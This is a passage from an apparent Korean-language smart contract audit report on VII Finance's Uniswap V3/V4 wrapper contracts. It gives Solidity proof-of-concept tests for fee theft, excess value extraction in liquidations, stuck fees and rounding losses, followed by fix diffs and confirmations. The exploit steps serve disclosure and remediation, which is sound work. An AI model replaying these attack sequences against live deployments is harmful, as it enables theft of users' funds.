+            params.tickLower,
+            params.tickUpper,
+            estimatedAmount0Required,
+            estimatedAmount1Required,
+            uint256(params.liquidityDelta),
+            _borrower
+        );
+    }

     function testGetSqrtRatioX96() public view {
         uint256 fixedDecimals = 10 ** 18;
@@ -418,6 +476,109 @@ contract UniswapV4WrapperTest is Test, UniswapBaseTest {
         assertApproxEqAbs(poolKey.currency1.balanceOf(borrower), amount1BalanceBefore + amount1Spent, 1);
     }

+    function test_feeTheftPoC() public {
+       int256 liquidityDelta = -19999;
+       uint256 swapAmount = 100_000 * unit0;
+
+       LiquidityParams memory params = LiquidityParams({
+           tickLower: TickMath.MIN_TICK + 1,
+           tickUpper: TickMath.MAX_TICK - 1,
+           liquidityDelta: liquidityDelta
+       });
+
+       // 1. create position on behalf of borrower
+       (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
+
+       address attacker = makeAddr("attacker");
+       deal(token0, attacker, 100 * unit0);
+       deal(token1, attacker, 100 * unit1);
+       startHoax(attacker);
+       SafeERC20.forceApprove(IERC20(token0), address(router), type(uint256).max);
+       SafeERC20.forceApprove(IERC20(token1), address(router), type(uint256).max);
+       SafeERC20.forceApprove(IERC20(token0), address(mintPositionHelper), type(uint256).max);
+       SafeERC20.forceApprove(IERC20(token1), address(mintPositionHelper), type(uint256).max);
+
+       // 2. create position on behalf of attacker
+       (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params, attacker);
+
+       // 3. wrap and enable tokenId1 for borrower
+       startHoax(borrower);
+       wrapper.underlying().approve(address(wrapper), tokenId1);
+       wrapper.wrap(tokenId1, borrower);
+       wrapper.enableTokenIdAsCollateral(tokenId1);
+
+       // 4. wrap and enable tokenId2 for attacker
+       startHoax(attacker);
+       wrapper.underlying().approve(address(wrapper), tokenId2);
+       wrapper.wrap(tokenId2, attacker);
+       wrapper.enableTokenIdAsCollateral(tokenId2);
+
+       // 5. swap so that some fees are generated for tokenId1 and tokenId2
+       swapExactInput(borrower, address(token0), address(token1), swapAmount);
+
+       (uint256 expectedFees0Position1, uint256 expectedFees1Position1) =
+           MockUniswapV4Wrapper(payable(address(wrapper))).pendingFees(tokenId1);
+
+       (uint256 expectedFees0Position2, uint256 expectedFees1Position2) =
+           MockUniswapV4Wrapper(payable(address(wrapper))).pendingFees(tokenId2);
+
+       console.log("Expected Fees Position 1: %s, %s", expectedFees0Position1, expectedFees1Position1);
+       console.log("Expected Fees Position 2: %s, %s", expectedFees0Position2, expectedFees1Position2);
+
+       // 6. unwrap 10% of tokenId1 for borrower which causes fees to be transferred to wrapper
+       startHoax(borrower);
+       wrapper.unwrap(
+           borrower,
+           tokenId1,
+           borrower,
+           wrapper.balanceOf(borrower, tokenId1) / 10,
+           bytes("")
+       );
+
+       console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
+       console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));
+
+       // 7. attacker fully unwraps tokenId2 through partial unwrap
+       startHoax(attacker);
+       wrapper.unwrap(
+           attacker,
+           tokenId2,
+           attacker,
+           wrapper.FULL_AMOUNT(),
+           bytes("")
+       );
+
+       console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
+       console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));
+
+       // 8. attacker recovers tokenId2 position
+       wrapper.unwrap(
+           attacker,
+           tokenId2,
+           attacker
+       );
+
+       // 9. attacker increases liquidity for tokenId2
+       IERC721(wrapper.underlying()).approve(address(mintPositionHelper), tokenId2);
+       increasePosition(poolKey, tokenId2, 1000, type(uint96).max, type(uint96).max, attacker);
+
+       // 10. attacker wraps tokenId2 again
+       wrapper.underlying().approve(address(wrapper), tokenId2);
+       wrapper.wrap(tokenId2, attacker);
+
+       // 11. attacker steals borrower's fees by partially unwrapping tokenId2 again
+       wrapper.unwrap(
+           attacker,
+           tokenId2,
+           attacker,
+           wrapper.FULL_AMOUNT() * 9 / 10,
+           bytes("")
+       );
+
+       console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
+       console.log("Wrapper balance of currency1: %s", currency1.balanceOf(address(wrapper)));
+
+       // 12. borrower tries to unwrap a further 10% of tokenId1 but it reverts because the owed fees were stolen
+       // startHoax(borrower);
+       // wrapper.unwrap(
+       //     borrower,
+       //     tokenId1,
+       //     borrower,
+       //     wrapper.FULL_AMOUNT() / 10,
+       //     bytes("")
+       // );
+    }
+
     function testFuzzFeeMath(int256 liquidityDelta, uint256 swapAmount) public {
         LiquidityParams memory params = LiquidityParams({
             tickLower: TickMath.MIN_TICK + 1,
--
2.40.0

```

**권장되는 완화 방법:** 해당 수수료가 징수되면 주어진 ERC-6909 `tokenId`에 대한 `tokensOwed` 상태를 감소시킵니다:

```diff
function _unwrap(address to, uint256 tokenId, uint256 amount, bytes calldata extraData) internal override {
        PositionState memory positionState = _getPositionState(tokenId);

        ...

+       uint256 proportionalFee0 =  proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount);
+       uint256 proportionalFee1 =  proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount);
+       tokensOwed[tokenId].fees0Owed -= proportionalFee0;
+       tokensOwed[tokenId].fees1Owed -= proportionalFee1;
-       poolKey.currency0.transfer(to, amount0 + proportionalShare(tokenId, tokensOwed[tokenId].fees0Owed, amount));
-       poolKey.currency1.transfer(to, amount1 + proportionalShare(tokenId, tokensOwed[tokenId].fees1Owed, amount));
+       poolKey.currency0.transfer(to, amount0 + proportionalFee0);
+       poolKey.currency1.transfer(to, amount1 + proportionalFee1);
    }
```

**VII Finance:** 커밋 [8c6b6cc](https://github.com/kankodu/vii-finance-smart-contracts/commit/8c6b6cca4ed65b22053dc7ffaa0b77d06a160caf)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다. 부분 언랩 후 `tokensOwed` 상태가 이제 감소합니다. Checks-Effects-Interactions 패턴을 엄격히 준수하기 위해 이는 외부 이체 호출 전에 발생해야 합니다(커밋 [88c9eec](https://github.com/kankodu/vii-finance-smart-contracts/commit/88c9eec6af4db1aaf7ddbd6d5fdd8a0cc0b65d93)에서 수정됨).


### 위반자가 담보로 활성화된 각 `tokenId`에 대해 전체 ERC-6909 공급량을 소유하지 않은 경우, 잘못된 이체 계산으로 인해 청산에 의해 예상보다 더 많은 가치가 추출될 수 있음

**설명:** `UniswapV3Wrapper` 및 `UniswapV4Wrapper` 컨트랙트가 일반적인 EVK 볼트 담보가 아니기 때문에, 주식 이체가 실행될 때 발신자에서 수신자로 기초 담보에 대한 청구권을 얼마나 이체해야 하는지 계산하는 방법이 필요합니다. 청산의 맥락에서 이 이체는 위반자에서 청산인으로 이루어집니다. 그러나 일반적인 맥락의 이체에 대해서도 이 기능을 구현하는 것이 필요합니다.

이는 호출자가 기초 담보 가치 측면에서 이체할 금액을 지정할 수 있는 `ERC721WrapperBase::transfer`에 의해 달성됩니다:

```solidity
/// @notice For regular EVK vaults, it transfers the specified amount of vault shares from the sender to the receiver
/// @dev For ERC721WrapperBase, transfers a proportional amount of ERC6909 tokens (calculated as totalSupply(tokenId) * amount / balanceOf(sender)) for each enabled tokenId from the sender to the receiver.
/// @dev no need to check if sender is being liquidated, sender can choose to do this at any time
/// @dev When calculating how many ERC6909 tokens to transfer, rounding is performed in favor of the sender (typically the violator).
/// @dev This means that the sender may end up with a slightly larger amount of ERC6909 tokens than expected, as the rounding is done in their favor.
function transfer(address to, uint256 amount) external callThroughEVC returns (bool) {
    address sender = _msgSender();
    uint256 currentBalance = balanceOf(sender);

    uint256 totalTokenIds = totalTokenIdsEnabledBy(sender);

    for (uint256 i = 0; i < totalTokenIds; ++i) {
        uint256 tokenId = tokenIdOfOwnerByIndex(sender, i);
        _transfer(sender, to, tokenId, normalizedToFull(tokenId, amount, currentBalance)); //this concludes the liquidation. The liquidator can come back to do whatever they want with the ERC6909 tokens
    }
    return true;
}
```

여기서 `balanceOf(sender)`는 각 `tokenId`의 합계 가치를 `unitOfAccount` 기준으로 반환하며, 이는 다시 `normalizedToFull()`에 의해 사용되어 전송자가 담보로 활성화한 각 ERC-6909 토큰의 비례 금액을 계산하여 이체해야 합니다. 이러한 계산은 전송자가 주어진 `tokenId`에 대해 전체 ERC-6909 토큰 공급량을 소유할 때 의도한 대로 작동합니다. 그러나 전송자가 주어진 `tokenId`의 100% 미만을 소유한 경우 이는 깨지며, 이체할 ERC-6909 토큰의 해당 계산이 실제보다 커지게 됩니다. 이는 결국 청산인이 요청한 것보다 `unitOfAccount`에서 더 많은 가치를 추출하게 합니다.

이 오류의 원인은 `normalizedToFull()` 함수에 있습니다:

```solidity
function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance) public view returns (uint256) {
    // @audit => multiplying by the total ERC-6909 supply of the specified tokenId is incorrect
    return Math.mulDiv(amount, totalSupply(tokenId), currentBalance);
}
```

여기서 지정된 `tokenId`의 ERC-6909 토큰 총 공급량이 곱셈에 잘못 사용되었으며, 대신 사용자가 소유한 ERC-6909 토큰의 실제 금액으로 정규화되어야 합니다.

**영향:** 청산에 의해 예상보다 더 많은 가치가 추출되어, 청산된 계정에 더 큰 손실을 입힐 수 있습니다. 이는 반복적인 부분 청산이나 차입자가 자신의 포지션 일부를 별도 계정으로 이체하는 시나리오에서 발생할 수 있습니다.

**PoC (Proof of Concept):** 아래 PoC에서 입증된 바와 같이, 담보로 활성화된 모든 `tokenIds`에 대해 ERC-6909 공급량의 100%를 소유하지 않은 사용자로부터 지정된 가치를 이체할 때 청산인은 예상보다 더 많은 가치를 받습니다.

이 첫 번째 PoC는 **담보로 활성화된 모든 `tokenIds`에 대해 100% ERC-6909 공급량을 소유한 사용자**로부터 일정 가치를 이체하는 시나리오를 보여줍니다. 여기서 이체는 예상대로 작동하며 청산인은 각 담보의 올바른 몫을 받습니다:

```solidity
function test_transferExpectedPoC() public {
    int256 liquidityDelta = -19999;

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: liquidityDelta
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId1, borrower);
    wrapper.wrap(tokenId2, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    address borrower2 = makeAddr("borrower2");

    // @audit-info => borrower owns a 100% of ERC-6909 supply of each tokenId
    uint256 beforeLiquidationBalanceOfBorrower1 = wrapper.balanceOf(borrower);

    address liquidator = makeAddr("liquidator");
    uint256 transferAmount = beforeLiquidationBalanceOfBorrower1 / 2;
    wrapper.transfer(liquidator, transferAmount);

    uint256 finalBalanceOfBorrower1 = wrapper.balanceOf(borrower);

    // @audit-info => liquidated borrower got seized the exact amount of assets requested by the liquidator
    startHoax(liquidator);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    assertApproxEqAbs(wrapper.balanceOf(liquidator), transferAmount, ALLOWED_PRECISION_IN_TESTS);
}
```

그러나 이 두 번째 PoC는 **담보로 활성화된 모든 `tokenIds`에 대해 100% ERC-6909 공급량을 소유하지 않은 사용자**로부터 일정 가치를 이체하는 시나리오를 보여줍니다. 이 경우 이체는 예상대로 작동하지 않으며 청산인에게 이체된 실제 가치는 요청된 것보다 많습니다:

```solidity
function test_transferUnexpectedPoC() public {
    int256 liquidityDelta = -19999;

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: liquidityDelta
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId1, borrower);
    wrapper.wrap(tokenId2, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    address borrower2 = makeAddr("borrower2");

    // @audit-info => liquidated borrower doesn't own 100% of both tokenIds
    wrapper.transfer(borrower2, tokenId1, wrapper.FULL_AMOUNT() / 2);

    uint256 beforeLiquidationBalanceOfBorrower1 = wrapper.balanceOf(borrower);

    address liquidator = makeAddr("liquidator");
    uint256 transferAmount = beforeLiquidationBalanceOfBorrower1 / 2;
    wrapper.transfer(liquidator, transferAmount);

    uint256 finalBalanceOfBorrower1 = wrapper.balanceOf(borrower);

    startHoax(liquidator);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // @audit-issue => because liquidated borrower did not have 100% of shares for both tokenIds, the liquidator earned more than requested
    //@audit-issue => liquidated borrower got seized more assets than they should have
    assertApproxEqAbs(wrapper.balanceOf(liquidator), transferAmount, ALLOWED_PRECISION_IN_TESTS);
}
```

**권장되는 완화 방법:** `normalizedToFull()`에서 공식을 다음과 같이 변경하십시오:
```diff
    function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance) public view returns (uint256) {
-       return Math.mulDiv(amount, totalSupply(tokenId), currentBalance);
+       return Math.mulDiv(amount, balanceOf(_msgSender(), tokenId), currentBalance);
    }
```

**VII Finance:** 커밋 [b7549f2](https://github.com/kankodu/vii-finance-smart-contracts/commit/b7549f2700af133ce98a4d6f19e43c857b5ea78a)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다. 이제 정규화에서 ERC-6909 총 공급량 대신 전송자의 실제 `tokenId` 잔고가 사용됩니다.

\clearpage
## 중위험 (Medium Risk)


### 수수료가 `UniswapV4Wrapper`에 묶일 수 있음

**설명:** Uniswap V4 포지션 유동성이 수정될 때, 예를 들어 유동성을 감소시키는 부분적 `UniswapV4Wrapper` 언랩의 경우, 미지불된 모든 수수료도 이체되며 완전히 정산되어야 합니다. 주어진 ERC-6909 `tokenId`의 여러 보유자에 대해, 비례 몫이 에스크로되고 주어진 보유자가 래퍼 컨트랙트와 상호 작용할 때 지급됩니다. 그러나 최종 보유자가 기초 포지션을 호출자에게 직접 이체하는 오버로드를 통해 전체 언랩을 수행하는 경우 수수료가 `UniswapV4Wrapper`에 묶이게 되는 엣지 케이스가 존재합니다.

다음 시나리오를 고려해 보십시오:
* Alice는 `tokenId1` 포지션의 전체 소유권을 가지고 있습니다.
* 포지션에 LP 수수료가 누적되었다고 가정합니다.
* Alice는 `tokenId1`을 부분적으로 언랩하여 기초 유동성의 일부를 제거합니다.
* 이로 인해 포지션의 나머지 부분에 해당하는 LP 수수료가 `UniswapV4Wrapper`에 누적됩니다.
* Alice는 최대 대출을 받고 나중에 완전히 청산됩니다.
* 청산인은 `tokenId1` 포지션을 완전히 언랩하고 기초 NFT를 받지만 이전에 누적된 수수료의 몫은 잃게 됩니다.
* 청산인은 전체 청산을 위해 받은 기초 포지션의 모든 유동성을 제거하고 포지션을 소각합니다.
* 결과적으로 포지션이 소각되었고 동일한 `tokenId`를 다시 발행하는 것이 불가능하기 때문에 래퍼에 남아 있는 수수료를 회수하는 것이 불가능합니다.

**영향:** 특정 엣지 케이스에서 LP 수수료가 `UniswapV4Wrapper` 계약에 묶일 수 있습니다. 이 손실은 중간 가능성으로 중간/높은 영향을 미칩니다.

**PoC (Proof of Concept):** 다음 테스트는 문제의 단순화된 데모입니다:

```solidity
function test_finalLosesFeesPoC() public {
    int256 liquidityDelta = -19999;
    uint256 swapAmount = 100_000 * unit0;

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: liquidityDelta
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    address borrower2 = makeAddr("borrower2");
    wrapper.transfer(borrower2, tokenId1, wrapper.FULL_AMOUNT() * 5 / 10);

    //swap so that some fees are generated
    swapExactInput(borrower, address(token0), address(token1), swapAmount);

    (uint256 expectedFees0Position1, uint256 expectedFees1Position1) =
        MockUniswapV4Wrapper(payable(address(wrapper))).pendingFees(tokenId1);

    console.log("Expected Fees Position 1: %s, %s", expectedFees0Position1, expectedFees1Position1);

    startHoax(borrower);
    wrapper.unwrap(
        borrower,
        tokenId1,
        borrower,
        wrapper.balanceOf(borrower, tokenId1),
        bytes("")
    );

    console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));

    startHoax(borrower2);
    wrapper.unwrap(borrower2, tokenId1, borrower2);

    console.log("Wrapper balance of currency0: %s", currency0.balanceOf(address(wrapper)));
    if (currency0.balanceOf(address(wrapper)) > 0 && wrapper.totalSupply(tokenId1) == 0) {
        console.log("Fees stuck in wrapper!");
    }
}
```

**권장되는 완화 방법:** 전체 언랩을 수행할 때 주어진 `tokenId`에 대해 누적된 미지불 수수료가 있는지 확인하고 이를 기초 NFT와 함께 수령인에게 이체하십시오. 이는 또한 작은 ERC-6909 잔고를 사용한 비례 몫 계산 중 바닥 반올림(floor rounding)으로 인해 발생할 수 있는 더스트(dust)가 계약에 축적되는 것을 방지하는 추가적인 이점이 있습니다.

**VII Finance:** 커밋 [bf5f099](https://github.com/kankodu/vii-finance-smart-contracts/commit/bf5f099b5d73dbff8fa6d403cb54ee6474828ac4)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다. 전체 언랩 수행 시 수수료가 이제 완전히 정산됩니다.


### 위반자에게 유리한 반올림은 부분 청산 중 청산인에게 손실을 줄 수 있음

**설명:** 현재 `ERC721WrapperBase::transfer`는 전송자에게 유리하게, 또는 청산의 맥락에서는 위반자에게 유리하게 반올림합니다:

```solidity
/// @notice For regular EVK vaults, it transfers the specified amount of vault shares from the sender to the receiver
/// @dev For ERC721WrapperBase, transfers a proportional amount of ERC6909 tokens (calculated as totalSupply(tokenId) * amount / balanceOf(sender)) for each enabled tokenId from the sender to the receiver.
/// @dev no need to check if sender is being liquidated, sender can choose to do this at any time
/// @dev When calculating how many ERC6909 tokens to transfer, rounding is performed in favor of the sender (typically the violator).
/// @dev This means that the sender may end up with a slightly larger amount of ERC6909 tokens than expected, as the rounding is done in their favor.
function transfer(address to, uint256 amount) external callThroughEVC returns (bool) {
    address sender = _msgSender();
    uint256 currentBalance = balanceOf(sender);

    uint256 totalTokenIds = totalTokenIdsEnabledBy(sender);

    for (uint256 i = 0; i < totalTokenIds; ++i) {
        uint256 tokenId = tokenIdOfOwnerByIndex(sender, i);
        _transfer(sender, to, tokenId, normalizedToFull(tokenId, amount, currentBalance)); //this concludes the liquidation. The liquidator can come back to do whatever they want with the ERC6909 tokens
    }
    return true;
}
```

이는 주어진 전송자의 기초 담보 가치에 대해 이체할 ERC-6909 토큰의 정규화된 양을 계산할 때 바닥 반올림(floor rounding)을 수행하는 `ERC721WrapperBase`의 `Math::mulDiv` 사용에서 비롯됩니다:

```solidity
function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance) public view returns (uint256) {
    return Math.mulDiv(amount, totalSupply(tokenId), currentBalance);
}
```

그러나 이 동작은 악의적인 행위자가 자신의 포지션 가치를 부풀리는 데 활용될 수 있습니다. 차입자가 여러 `tokenIds`를 담보로 활성화하는 시나리오를 고려할 때, 주어진 `tokenId`에 대한 ERC-6909 토큰 잔고 중 1 wei를 제외한 모두를 언랩하면 이것이 가능합니다. 이는 또한 이전의 부분 청산에 의한 비례 계산에 따라 `tokenIds` 중 하나가 완전히 이체되는 경우에도 발생할 수 있습니다. 두 경우 모두 반올림으로 인해 1 wei가 남게 되며, 이는 후속 청산 중에 문제를 일으킬 수 있습니다.

기초 포지션에 유동성을 추가하여 ERC-6909 토큰 1 wei의 가치를 부풀리는 것은 불가능합니다. 전체 포지션을 원자적으로 언랩하고 유동성을 추가하고 다시 랩핑하는 것(다른 계정이 소유한 유동성을 수정할 때 Uniswap에 의해 구현된 접근 제어로 인해 필요함)은 ERC-6909 토큰의 `FULL_AMOUNT`가 다시 발행되는 결과를 초래하기 때문입니다. 그러나 포지션의 가치에 기여하는 기부 및 스왑에서 발생하는 수수료 축적을 활용하여 이러한 방식으로 1 wei를 부풀리는 것은 가능합니다.

따라서 청산인이 전체 청산을 수행하거나 ERC-6909 토큰을 전혀 받지 못하는 부분 청산으로 인한 손실을 감수해야 하는 시나리오를 피하기 위해 청산인에게 유리하게 반올림해야 합니다.

**영향:** 청산인은 부분 청산 중 손실을 입을 수 있으며, 특히 ERC-6909 토큰 공급량이 1 wei로 줄어든 후 기초 Uniswap 포지션에 상당한 수수료가 누적된 경우 더욱 그렇습니다.

**PoC (Proof of Concept):** `forge test --mt test_transferRoundingPoC -vvv`로 다음 테스트를 실행하십시오:

* H-02에 설명된 대로 이체 인플레이션 수정이 적용되지 않은 상태에서 바닥 반올림 설정은 이 첫 번째 테스트에서 관찰할 수 있습니다:

```solidity
function test_transferRoundingPoC_currentTransfer() public {
    address borrower2 = makeAddr("borrower2");

    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);

    // 2. borrower sends some of tokenId1 to borrower2
    wrapper.transfer(borrower2, wrapper.balanceOf(borrower) / 2);

    // 3. borrower wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // 4. borrower max borrows from vault
    evc.enableCollateral(borrower, address(wrapper));
    evc.enableController(borrower, address(eVault));
    eVault.borrow(type(uint256).max, borrower);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 5. simulate borrower becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertTrue(maxRepay > 0);

    // 6. liquidator partially liquidates borrower
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    eVault.liquidate(borrower, address(wrapper), maxRepay / 2, 0);

    console.log("balanceOf(borrower, tokenId1): %s", wrapper.balanceOf(borrower, tokenId1));
    console.log("balanceOf(borrower, tokenId2): %s", wrapper.balanceOf(borrower, tokenId2));
}
```

* H-02 수정이 적용되었다고 가정할 때, 위반자에게 유리한 반올림으로 인한 부분 청산 중 청산인 손실은 다음 테스트에서 관찰할 수 있습니다:

```solidity
function test_transferRoundingPoC_transferFixed() public {
    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });

    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);

    startHoax(borrower);

    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);

    // 2. borrower unwraps all but 1 wei of tokenId1
    wrapper.unwrap(
        borrower,
        tokenId1,
        borrower,
        wrapper.FULL_AMOUNT() - 1,
        bytes("")
    );

    // 3. borrower wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    // 4. borrower max borrows from vault
    evc.enableCollateral(borrower, address(wrapper));
    evc.enableController(borrower, address(eVault));
    eVault.borrow(type(uint256).max, borrower);

    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());

    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);

    // 5. swap to accrue fees
    swapExactInput(borrower, address(token0), address(token1), 100 * unit0);

    // 6. simulate borrower becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(
            new FixedRateOracle(
                address(wrapper),
                unitOfAccount,
                1
            )
        )
    );

    (maxRepay, yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertTrue(maxRepay > 0);

    // 7. liquidator partially liquidates borrower but receives no tokenId1
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);

    uint256 liquidatorBalanceOfTokenId1Before = wrapper.balanceOf(liquidator, tokenId1);
    uint256 liquidatorBalanceOfTokenId2Before = wrapper.balanceOf(liquidator, tokenId2);
    eVault.liquidate(borrower, address(wrapper), maxRepay / 2, 0);
    uint256 liquidatorBalanceOfTokenId1After = wrapper.balanceOf(liquidator, tokenId1);
    uint256 liquidatorBalanceOfTokenId2After = wrapper.balanceOf(liquidator, tokenId2);

    console.log("balanceOf(borrower, tokenId1): %s", wrapper.balanceOf(borrower, tokenId1));
    console.log("balanceOf(borrower, tokenId2): %s", wrapper.balanceOf(borrower, tokenId2));

    console.log("liquidatorBalanceOfTokenId1Before: %s", liquidatorBalanceOfTokenId1Before);
    console.log("liquidatorBalanceOfTokenId1After: %s", liquidatorBalanceOfTokenId1After);

    console.log("liquidatorBalanceOfTokenId2Before: %s", liquidatorBalanceOfTokenId2Before);
    console.log("liquidatorBalanceOfTokenId2After: %s", liquidatorBalanceOfTokenId2After);

    assertGt(liquidatorBalanceOfTokenId1After, liquidatorBalanceOfTokenId1Before);
    assertGt(liquidatorBalanceOfTokenId2After, liquidatorBalanceOfTokenId2Before);
}
```

**권장되는 완화 방법:** 청산인에게 유리하게 반올림하는 것을 고려하십시오:

```diff
    function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance) public view returns (uint256) {
-        return Math.mulDiv(amount, totalSupply(tokenId), currentBalance);
+        return Math.mulDiv(amount, balanceOf(_msgSender(), tokenId), currentBalance, Math.Rounding.Ceil);
    }
```

또한 청산인이 0값 청산을 실행하는 것을 방지하여, 위반자로부터 고가치 포지션의 1 wei를 반복적으로 추출할 수 있는 시나리오를 피하는 것을 고려하십시오.

**VII Finance:** 커밋 [5e825d5](https://github.com/kankodu/vii-finance-smart-contracts/commit/5e825d5f2eee6789b646bd0f00e9a9a53b5039ca)에서 수정되었습니다.

**Cyfrin:** 확인되었습니다. 이체는 이제 수신자(일반적으로 청산인)에게 유리하게 올림 처리됩니다. 청산인이 0값 청산을 실행하는 것이 명시적으로 방지되지는 않았습니다.

**VII Finance:** 청산이 발생할 때, 대출된 토큰과 관련된 Euler 볼트는 EVC에 `_msgSender()`를 위반자로 주입하고 to = 청산인, amount = 청산인이 위반자의 부채를 떠안는 대가로 받을 자격이 있는 금액으로 이체 함수를 호출하도록 요청합니다. 래퍼가 관련된 한, 0값 청산은 단지 0값 이체일 뿐입니다. 래퍼는 ERC20 표준을 따르는 다른 Euler 볼트가 0값 이체를 허용하는 것과 같은 방식으로 이를 허용합니다. 우리는 0값 이체를 막을 필요가 없다고 봅니다.

**Cyfrin:** 인지하였습니다.

\clearpage
## 저위험 (Low Risk)


### 비례 LP 수수료 이체 중 수행되는 안전하지 않은 외부 호출이 래퍼 계약 재진입에 사용될 수 있음

**설명:** `ERC721WrapperBase`는 주어진 `tokenId`에 대한 ERC-6909 포지션의 전체 및 부분 언랩을 수행하기 위해 `unwrap()` 함수의 두 가지 오버로드를 노출합니다. 부분 언랩은 호출자로부터 지정된 양의 ERC-6909 토큰을 소각하는 데 사용되며, 가상의 `_unwrap()` 함수를 통해 모든 ERC-6909 보유자 간에 LP 수수료의 비례 배분을 처리하며, `UniswapV3Wrapper` 및 `UniswapV4Wrapper`에 대해 각각 `UniswapV3Pool` 및 `PoolManager`에서 토큰을 직접 이체합니다:

```solidity
function unwrap(address from, uint256 tokenId, address to, uint256 amount, bytes calldata extraData)
    external
    callThroughEVC
{
    _unwrap(to, tokenId, amount, extraData);
    // @audit - native ETH/ERC-777 token can be used to reenter here
    _burnFrom(from, tokenId, amount);
}
```

이체 훅이 있는 토큰(예: ERC-777) 또는 Uniswap V4의 경우 네이티브 ETH를 포함하는 기초 포지션을 사용하도록 구성된 래퍼의 경우, 외부 호출은 전송자의 잔고와 ERC-6909 토큰 총 공급량이 감소하기 전에 실행을 재진입하기 위해 사용자가 제공한 `to` 주소에 의해 활용될 수 있습니다.

